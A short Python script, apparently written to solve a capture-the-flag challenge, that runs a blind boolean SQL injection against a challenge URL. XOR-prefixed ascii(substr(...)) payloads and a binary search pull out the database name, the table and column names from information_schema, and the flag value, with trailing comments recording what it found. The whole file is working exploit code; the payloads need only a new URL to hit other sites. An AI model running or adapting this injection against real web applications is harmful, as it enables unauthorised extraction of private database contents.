# -*- coding: utf-8 -*-
#version:python3.8
import requests
import time


url = "http://ab2cc113-e18d-403c-981d-83e79e401b27.node3.buuoj.cn/?stunum=1"
res = ''
for i in range(1,50):
    print(i)
    left = 31
    right = 127
    mid = left + ((right - left)>>1)
    while left < right:        
        # payload = "^(ascii(substr(database(),{},1))>{})".format(i,mid)
        payload = "^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),{},1))>{})".format(i,mid)
        #payload = "^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))>{})".format(i,mid)
        # payload = "^(ascii(substr((select(value)from(flag)),{},1))>{})".format(i,mid)
        r = requests.get(url=url+payload,proxies = {
            'http': 'http://proxy2.dq.petrochina:8080',
            'https': 'http://proxy2.dq.petrochina:8080',
        })
        if r.status_code == 429:
            print('too fast')
            time.sleep(1)
        if 'Hi admin, your score is: 100' not in r.text:
            left = mid + 1
        elif 'Hi admin, your score is: 100'  in r.text:
            right = mid 
        mid = left + ((right-left)>>1)
    if mid == 31 or mid == 127:
        break    
    res += chr(mid)
    print(str(mid),res)
#库名 ctf 
#表名 flag,score
#flag表中的列名 flag,value